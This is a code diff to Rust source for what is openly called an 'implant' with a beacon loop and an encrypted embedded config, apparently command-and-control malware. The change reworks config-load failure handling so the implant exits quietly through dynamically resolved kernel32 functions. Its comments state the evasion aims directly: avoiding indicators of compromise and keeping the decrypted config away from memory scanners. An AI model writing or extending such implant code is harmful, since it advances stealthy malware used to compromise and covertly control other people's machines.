@@ -69,8 +69,10 @@ mod baked {
 /// Decrypt + decode the embedded config blob into a [`Config`]. Called once at
 /// entry (`beacon_loop` bootstrap). A failure here is fatal: either the
 /// embedded config was tampered with (Poly1305 tag mismatch) or the build is
-/// broken (blob shape wrong). Panics on either — the implant cannot beacon
-/// without a config.
+/// broken (blob shape wrong). On either, the implant exits with a distinct
+/// NTSTATUS-style code via ExitProcess → TerminateProcess → int3 — it cannot
+/// beacon without a config, and a clean exit is preferable to a hang (which is
+/// a louder IOC than a quiet termination).
 ///
 /// Returns `(Config, Vec<u8>)` — the decoded config and the raw decrypted
 /// plaintext bytes. The caller MUST leak the `Vec<u8>` (via
@@ -78,34 +80,45 @@ mod baked {
 /// process lifetime. This prevents memory scanners from reading the decrypted
 /// config at rest.
 pub fn load() -> (Config, Vec<u8>) {
-    let plain: Vec<u8> =
-        nyx_config::decrypt(&baked::CONFIG_KEY, &baked::CONFIG_NONCE, baked::CONFIG_CT);
+    // CRITICAL-1 fix: decrypt now returns Result instead of panicking on AEAD
+    // tag mismatch. Under panic=abort a corrupted embedded config used to tear
+    // the process down with no diagnostic; we now exit with a dedicated code
+    // (0xC000_0002) so a config-tamper is identifiable from the exit status.
+    let plain: Vec<u8> = match nyx_config::decrypt(
+        &baked::CONFIG_KEY,
+        &baked::CONFIG_NONCE,
+        baked::CONFIG_CT,
+    ) {
+        Ok(p) => p,
+        Err(_) => fatal_config(0xC000_0002), // AEAD tag mismatch / tampered config
+    };
     match decode(&plain) {
         Ok(c) => (c, plain),
-        Err(_) => {
-            // Tampered or malformed baked config — the implant cannot proceed.
-            // Try ExitProcess → TerminateProcess → int3 in order. A crash is
-            // better than a hanging process (visible IOC).
-            unsafe {
-                if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
-                    let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
-                    f(0xC000_0001);
-                }
-                // ExitProcess failed — try TerminateProcess.
-                if let Some(addr) =
-                    crate::resolve::export_addr(b"kernel32.dll", b"TerminateProcess")
-                {
-                    type FnTerm = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> i32;
-                    let f: FnTerm = core::mem::transmute(addr);
-                    f((-1isize) as *mut core::ffi::c_void, 1);
-                }
-                // Last resort: clean crash (distinguishable from hang).
-                core::arch::asm!("int3");
-            }
-            loop {
-                core::hint::spin_loop();
-            }
+        Err(_) => fatal_config(0xC000_0001), // decrypted but shape wrong (broken build)
+    }
+}
+
+/// Fatal config-load path. Resolves ExitProcess → TerminateProcess → int3 and
+/// exits with `code` (an NTSTATUS-style value so it is distinguishable from
+/// the `0xNN` selftest bitmasks in `selftests.rs`). Never returns.
+///
+/// `code` choices:
+///   `0xC000_0001` = decrypted OK but the plaintext shape is wrong (broken build).
+///   `0xC000_0002` = AEAD tag mismatch (tampered/corrupted embedded config).
+fn fatal_config(code: u32) -> ! {
+    unsafe {
+        if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
+            let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
+            f(code);
         }
+        // ExitProcess unresolved — try TerminateProcess (current process handle = -1).
+        if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"TerminateProcess") {
+            type FnTerm = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> i32;
+            let f: FnTerm = core::mem::transmute(addr);
+            f((-1isize) as *mut core::ffi::c_void, code);
+        }
+        // Last resort: clean crash (distinguishable from a hang IOC).
+        core::arch::asm!("int3", options(noreturn));
     }
 }
 
